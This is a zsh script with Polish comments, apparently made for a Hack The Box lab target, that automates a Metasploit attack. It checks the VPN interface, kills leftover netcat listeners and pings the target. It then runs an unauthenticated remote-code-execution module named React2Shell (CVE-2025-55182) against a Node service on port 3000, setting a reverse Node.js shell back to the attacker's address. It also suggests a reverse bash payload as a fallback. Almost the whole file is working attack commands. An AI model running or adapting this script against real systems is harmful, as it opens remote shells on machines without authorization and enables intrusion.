#!/bin/zsh
# ReactorWatch — React2Shell widoczny w terminalu (Ania)
set -e
export PATH=/usr/bin:/bin:/usr/sbin:/sbin

clear
echo "=============================================="
echo "  ReactorWatch — React2Shell (widzisz wszystko)"
echo "=============================================="
echo ""

echo "[1] VPN tun0:"
ip -br a show tun0 || { echo "BRAK tun0 — odpal: ~/Desktop/htb/scripts/vpn-htb-eu.sh"; exit 1; }
LHOST=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)
echo "    LHOST (wpisz w MSF): $LHOST"
echo ""

echo "[2] Zabijam stare nc/msf na 4444 (konflikt listenera)..."
pkill -f 'nc.*4444' 2>/dev/null || true
pkill -f 'nc -lvnp 4444' 2>/dev/null || true
sleep 1
echo "    OK"
echo ""

echo "[3] Ping celu 10.129.245.214..."
ping -c 2 -W 2 10.129.245.214 || exit 1
echo ""

echo "[4] MSF: check + run (reverse_nodejs, port 4444)"
echo "    NIE odpalaj osobno nc — MSF sam trzyma handler."
echo "    --- start MSF ---"
echo ""

msfconsole -q << MSF
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS 10.129.245.214
set RPORT 3000
set TARGETURI /
set LHOST ${LHOST}
set LPORT 4444
set PAYLOAD cmd/unix/reverse_nodejs
set FETCH_WRITABLE_DIR /tmp
set VERBOSE true
check
run
sleep 3
sessions -l
MSF

echo ""
echo "[5] Jeśli sesja jest — w msf wpisz: sessions -i 1"
echo "    Jak brak sesji — spróbuj: set PAYLOAD cmd/unix/reverse_bash i run"
echo ""
read "? Naciśnij Enter żeby zamknąć okno..."
